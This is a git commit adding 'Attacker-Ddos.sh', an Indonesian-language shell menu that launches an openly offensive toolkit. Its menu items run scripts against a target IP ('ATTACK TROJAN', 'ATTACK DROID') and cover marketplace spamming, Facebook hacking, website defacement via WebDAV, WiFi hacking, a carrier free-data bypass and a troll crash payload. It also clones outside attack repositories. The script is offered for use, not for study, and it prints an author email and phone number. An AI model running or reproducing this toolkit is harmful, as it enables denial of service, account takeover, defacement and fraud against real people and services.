88fbce5ccfbe621aff9d471b22dc07228769ae0a
galogandang <52029720+galogandang@users.noreply.github.com>
2019-08-12 18:39:47 +0700

    Create Attacker-Ddos.sh

---
+++ Attacker-Ddos.sh
@@ -0,0 +1,292 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+teme='\033[96;m'        
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+pantek='\033[29;1m'
+clear
+echo $green
+figlet kusus buat alena sayang
+sleep 5
+echo $green
+figlet Mr.Cracker87
+toilet -f slant " TOOLS BY MR.YUDISCRACKING " |lolcat
+echo
+echo $teme"Welcom To My Tools"
+echo  $teme"jangan lupa Subkreb chanel ku ya bos"
+echo $teme"Namanya CrackerTube"
+sleep 5
+clear
+echo $red
+figlet Mr.Cracker87
+sleep 1
+echo $blue"|========================================|"
+sleep 0.3
+echo $blue"|AUTOUR  :Mr.Cracker87                   |"
+sleep 0.3
+echo $blue"|VERSION :1.5                            |"
+sleep 0.3
+echo $blue"|JUDUL   :TOOLS BY Mr.Cracker87          |"
+sleep 0.3
+echo $blue"|========================================|"
+sleep 0.3
+echo $teme"|========================================|"
+sleep 0.3
+echo $teme"|Email  :Tzyudistira@gmail.com===========|"
+sleep 0.3
+echo $teme"|WhatsApp:+6281370040608=================|"
+sleep 0.3
+echo $teme"|Pesan :Gunakan Tool ini dengan Bijal====|"
+sleep 0.3
+echo $teme"|Web = https://github.com/===============|"
+sleep 0.3
+echo $teme"|========================================|"
+sleep 0.3
+echo $red"|========================================|"
+sleep 0.3
+echo $yellow"|----------------TOOLS-------------------|"
+sleep 0.3
+echo $red"|========================================|"
+sleep 0.3
+echo $white"[1].ATTACK TROJAN"$green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[2].ATTACK DROID"$green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[3].SPAM TOKPED"$green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[4].TERKEY" $green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[5].Hack Facebook"         $green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[6].Troll Project" $green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[7].Deface Web Vuln" $green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[8].LITESCRIPT DEFACE" $green"[ON]"
+sleep 0.01
+echo $red"----------------------------------"
+echo $white"[9].PAKET GRATIS[TELKOMSEL]"$green"[ON]"
+sleep 0.01
+echo $red"-----------------------------------"
+echo $white"[10].Hack Wifi khusus Root"$green"[ON]"
+sleep 0.01
+echo $red"-----------------------------------"
+echo $white"[11].VIRTEX"$green"[ON]"
+echo $red"-----------------------------------"
+echo $white"[0].EXIT Cooming soon"
+echo $red"-----------------------------------"
+echo $red"SIALAKAN PILIH BOS QU" $yellow
+read -p "====>" bro
+
+if [ $bro =   ] || [ $bro =   ]
+then
+echo $red""
+figlet MR.Cracking
+echo
+cd /sdcard/DdosAttack
+echo
+sh Attacker-Ddos.sh
+fi
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " ATTACK TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+cd File
+echo
+python win.32.64.NT.py -s$ipt -p80 -t135
+clear
+echo
+cd $Home/DdosAttack
+echo
+sh Attacker-Ddos.sh
+clear
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " ATTACK DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+cd File
+echo
+python andromeda.py -s$ipt -p80 -t135
+echo
+sh Attacker-Ddos.sh
+fi
+
+if [ $bro = 3 ]  || [ $bro = 3 ]
+then
+clear
+echo
+python2 Tokped.py
+echo
+cd $Home/DdosAttack
+echo
+sh Attacker-Ddos.sh
+fi
+
+if [ $bro = 4 ]  || [ $bro = 4 ]
+then
+clear
+echo
+git clone https://github.com/karjok/terkey
+echo
+cd terkey
+echo
+cd File
+echo
+python terkey.py
+echo
+cd $Home/DdosAttack
+clear
+echo
+sh Attacker-Ddos.sh
+fi
+
+if [ $bro = 5 ]  || [ $bro = 5 ]
+then
+echo $green"[a]Sudah Install? Lanjut!"
+echo $green"[b]install dulu bahannya" $yellow
+read -p "Pilih=>" xxx
+clear
+fi
+
+if [ $xxx = b ]  || [ $xxx = b ]
+then
+clear
+echo
+apt install python2
+echo
+apt install pip2 install mechanize
+echo
+apt install pip2 request
+fi
+
+if [ $xxx = a ] || [ $xxx = a ]
+then
+echo
+cd /sdcard/DdosAttack/File/SETAN
+echo
+python2 SETAN.py
+fi
+
+if [ $bro = 6 ] || [ $bro = 6 ]
+then
+echo
+cd File
+echo
+sh troll.sh
+clear
+echo
+cd $Home/DdosAttack
+echo
+sh Attacker-Ddos.sh
+clear
+fi
+
+if [ $bro = 7 ] || [ $bro = 7 ]
+then
+clear
+echo $green"Masukin Webnya Bro"
+echo $green" :) "
+read -p "===>" qw
+echo
+cd File
+echo
+python webdav.py  $qw  index.html
+fi
+
+if [ $bro = 8 ] || [ $bro = 8 ]
+then
+clear
+echo
+cd File
+echo
+python2 LITESCRIPT.py
+clear
+echo
+sh Attacker-Ddos.sh
+fi
+
+if [ $bro = 9 ] || [ $bro = 9 ]
+then
+clear
+toilet -f slant "Paket Gratis" |lolcat
+echo "[1] install dulu Psiponnya"
+echo "[2] Masukin HostAndress 127.1.1.8"
+echo "[3] Portnya 10011"
+echo "[4] Jalankan Scriptnya"
+echo "!Sekarang Buka Psiphonnya"
+echo "Loading Sekrip..."
+sleep 5
+echo "Sukses"
+read -p "Udah install bahannya?[y/n]" etc
+clear
+fi
+
+if [ $etc = y ] || [ $etc = y ]
+then
+echo
+cd File
+echo
+python2 polosan_tesel.py
+fi
+
+if [ $etc = n ] || [ $etc = n ]
+then
+echo $green"Lagi Siapin Bahannya"
+echo "Tunggu Bentar..."
+sleep 3
+echo
+pip2 install requests
+echo
+pip2 install mechanize
+echo
+pkg install python2
+echo
+pkg install python
+echo
+pip2 install bs4
+clear
+echo $green"Sukses"
+sleep 1
+clear
+echo
+cd File
+echo
+python2 polosan_tesel.py
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+echo
+sh wifi-hacker.sh
+clear
+fi
+
+if [ $bro = 11 ] || [ $bro = 11 ]
+then
+clear
+#git clone https://github.com/muhammadfathul/VIRTEX
+echo
+cd VIRTEX
+echo
+sh virtex.sh
+fi
+
